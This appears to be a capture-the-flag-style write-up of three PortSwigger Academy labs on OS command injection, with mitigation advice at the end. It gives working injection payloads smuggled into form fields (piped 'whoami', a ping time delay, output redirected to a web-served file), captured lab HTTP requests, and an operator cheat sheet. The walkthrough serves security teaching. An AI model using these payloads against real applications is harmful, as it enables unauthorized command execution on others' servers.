# OS Command Injection — PortSwigger Web Security Academy

> **Category:** Server-Side Injection  
> **Platform:** PortSwigger Web Security Academy  
> **Difficulty:** Apprentice → Practitioner  
> **Labs Covered:** 3 labs  
> **Author:** [XENOS](https://github.com/obadahamed)

---

## Table of Contents

- [Background](#background)
- [Lab 1 — OS Command Injection, Simple Case](#lab-1--os-command-injection-simple-case)
- [Lab 2 — Blind OS Command Injection with Time Delays](#lab-2--blind-os-command-injection-with-time-delays)
- [Lab 3 — Blind OS Command Injection with Output Redirection](#lab-3--blind-os-command-injection-with-output-redirection)
- [Key Differences: Visible vs Blind Injection](#key-differences-visible-vs-blind-injection)
- [Shell Injection Operators — Quick Reference](#shell-injection-operators--quick-reference)
- [Mitigation](#mitigation)

---

## Background

**OS Command Injection** (also called Shell Injection) occurs when a web application passes user-controlled data to a system shell without proper sanitization. The attacker injects shell metacharacters to chain additional commands, effectively executing arbitrary OS-level commands with the application's privileges.

### How the backend looks (conceptually)

Assume the application runs a stock check like this:

```bash
stockreport.sh <productId> <storeId>
```

If the server does something like:

```python
import subprocess
output = subprocess.check_output(f"stockreport.sh {productId} {storeId}", shell=True)
```

An attacker can inject into `storeId`:

```
1|whoami
```

Which the shell evaluates as:

```bash
stockreport.sh 123 1 | whoami
```

The `|` pipes the output of the first command into `whoami`, and the result of `whoami` is returned.

---

## Lab 1 — OS Command Injection, Simple Case

### Objective

Execute the `whoami` command via the product stock checker and read the output directly from the HTTP response.

### Vulnerability Type

**Visible / In-Band OS Command Injection** — output is directly returned in the response body.

### Exploitation Steps

**Step 1 — Identify the target parameter**

Open the application and trigger a stock check. Intercept the request in Burp Suite:

```http
POST /product/stock HTTP/2
Host: <lab-id>.web-security-academy.net

productId=1&storeId=1
```

The `storeId` parameter is passed directly to a shell command.

**Step 2 — Inject the payload**

Modify `storeId` to chain a second command using the pipe operator `|`:

```
storeId=1|whoami
```

The full modified request body:

```
productId=1&storeId=1|whoami
```

**Step 3 — Observe the result**

The HTTP response body now contains the OS username instead of a stock count:

```
peter-abc123
```

### Why This Works

The pipe operator `|` takes the stdout of the left command and passes it as stdin to the right command. Since `whoami` doesn't need stdin, the output of the second command (`whoami`) is what gets returned, effectively replacing the expected application output.

### Mental Model

```
Server executes:   stockreport.sh 1 1|whoami
Shell parses as:   (stockreport.sh 1 1) | (whoami)
Response returns:  peter-abc123
```

---

## Lab 2 — Blind OS Command Injection with Time Delays

### Objective

Exploit a blind command injection in the feedback form by causing a deliberate **10-second time delay** using `ping`.

### Vulnerability Type

**Blind / Out-of-Band OS Command Injection (Time-Based)** — there is no visible output. Injection is confirmed through response timing.

### Why "Blind"?

The application still executes our injected command, but the output is silently discarded — it never appears in the HTTP response. Confirmation requires a side-channel technique.

### The Time-Based Technique

`ping -c 10 127.0.0.1` sends 10 ICMP packets to localhost with roughly 1 second between each, creating a ~10 second delay. If the server responds 10 seconds late, the injection succeeded.

### Exploitation Steps

**Step 1 — Intercept the feedback request**

Submit the feedback form and capture the request in Burp Suite:

```http
POST /feedback/submit HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=...&name=obada&email=obada%40gmail.com&subject=test&message=test
```

**Step 2 — Inject the payload into `email`**

```
email=x||ping+-c+10+127.0.0.1||
```

> **Note:** `+` is the URL-encoded form of a space in `application/x-www-form-urlencoded`.

The double `||` operators are used intentionally:
- **Left `||`**: If the preceding command fails, execute what follows (always runs).
- **Right `||`**: Terminates the injection and separates it from any remaining shell context.

**Step 3 — Send the modified request**

```
csrf=WwGOtYAgzu0FkheP2qJuiFk6SYsxCFJm&name=obada&email=x||ping+-c+10+127.0.0.1||&subject=test&message=test
```

**Step 4 — Observe the delay**

The HTTP response takes approximately **10 seconds** to arrive — confirming blind command injection.

### Full Request (from lab)

```http
POST /feedback/submit HTTP/2
Host: 0adf00160462f2aa94811b10001c008c.web-security-academy.net
Cookie: session=mBbd64GZwQTqnq3fDaBnLCJ0tiUecctL
Content-Type: application/x-www-form-urlencoded

csrf=WwGOtYAgzu0FkheP2qJuiFk6SYsxCFJm&name=obada&email=obadahamed%40gmail.com||ping+-c+10+127.0.0.1||&subject=dadsdad&message=asdasdasd
```

### Mental Model

```
Server executes:   process_feedback.sh ... x||ping -c 10 127.0.0.1||
Shell evaluates:   x fails → run ping -c 10 127.0.0.1 → ~10s delay
Response arrives:  10 seconds late → injection confirmed ✓
```

---

## Lab 3 — Blind OS Command Injection with Output Redirection

### Objective

Redirect the output of `whoami` to a file in a web-accessible directory, then retrieve it via a second HTTP request.

### Vulnerability Type

**Blind OS Command Injection with Output Redirection** — output is extracted by writing to disk and reading via the web server.

### The Core Idea

Since output is not reflected in the response, we write command output to a file in a directory the web server can serve. We then request that file directly.

```
                              ┌──────────────────────────────┐
Inject → whoami > file.txt   │  /var/www/images/output.txt  │
                              └──────────────┬───────────────┘
                                             │
Request /image?filename=output.txt ──────────┘
Read the file contents from response
```

### Exploitation Steps

**Step 1 — Intercept the feedback submission**

```http
POST /feedback/submit HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=...&name=obada&email=obada%40gmail.com&subject=test&message=test
```

**Step 2 — Inject the payload**

Redirect `whoami` output to the writable images directory:

```
email=||whoami>/var/www/images/output.txt||
```

The `>` operator redirects stdout to the specified file. `/var/www/images/` is both writable by the app process and served publicly.

**Full modified body:**

```
csrf=JP325cK69MaTH8yr5iYCNSCsE2V8YFp1&name=obada&email=obada%40gamil.com||whoami>/var/www/images/output.txt||&subject=obada&message=asdasdsad
```

**Step 3 — Intercept a product image request**

Browse to a product and capture a request that loads an image:

```http
GET /image?filename=23.jpg HTTP/2
```

**Step 4 — Replace the filename with our output file**

```http
GET /image?filename=output.txt HTTP/2
```

**Step 5 — Read the response**

```
peter-abc123
```

The file contains the output of `whoami` — injection confirmed and data exfiltrated.

### Full Requests (from lab)

**Injection request:**

```http
POST /feedback/submit HTTP/2
Host: 0aee00ed035d91448173c541007900f2.web-security-academy.net
Cookie: session=7sUjUfnCZL7JQdXxELr5U3Gi6ey80HzF
Content-Type: application/x-www-form-urlencoded

csrf=JP325cK69MaTH8yr5iYCNSCsE2V8YFp1&name=obada&email=obada%40gamil.com||whoami>/var/www/images/output.txt||&subject=obada&message=asdasdsad
```

**Retrieval request:**

```http
GET /image?filename=output.txt HTTP/2
Host: 0aee00ed035d91448173c541007900f2.web-security-academy.net
```

---

## Key Differences: Visible vs Blind Injection

| Property | Lab 1 (Visible) | Lab 2 (Blind – Time) | Lab 3 (Blind – Redirect) |
|---|---|---|---|
| **Output visible in response?** | ✅ Yes | ❌ No | ❌ No |
| **Injection confirmed via** | Response body | Response delay | Secondary HTTP request |
| **Exfiltration method** | Direct (in-band) | None (detection only) | File write → URL fetch |
| **Requires writable path?** | No | No | Yes |
| **Difficulty** | Low | Low | Medium |

---

## Shell Injection Operators — Quick Reference

| Operator | Behavior | Example |
|---|---|---|
| `\|` | Pipe: pass stdout of left to stdin of right | `ls \| whoami` |
| `\|\|` | OR: run right only if left fails | `false\|\|whoami` |
| `&&` | AND: run right only if left succeeds | `true&&whoami` |
| `;` | Sequence: always run right after left | `ls;whoami` |
| `` `cmd` `` | Subshell: execute and substitute | `` echo `whoami` `` |
| `$(cmd)` | Subshell (modern syntax) | `echo $(whoami)` |

---

## Mitigation

1. **Never pass user input to shell commands.** Use language-native APIs instead (e.g., `subprocess.run(["stockreport.sh", productId, storeId])` — argument list, not shell=True).
2. **Whitelist input strictly.** If the parameter must be numeric, validate it as an integer before use.
3. **Avoid `shell=True`** in Python (and equivalent in other languages) — this is what enables injection.
4. **Principle of least privilege.** The application process should not run as root.
5. **WAF rules** can help, but are not a substitute for proper input handling.

---

> *"The shell doesn't know trust. It only knows syntax."*  
> — XENOS
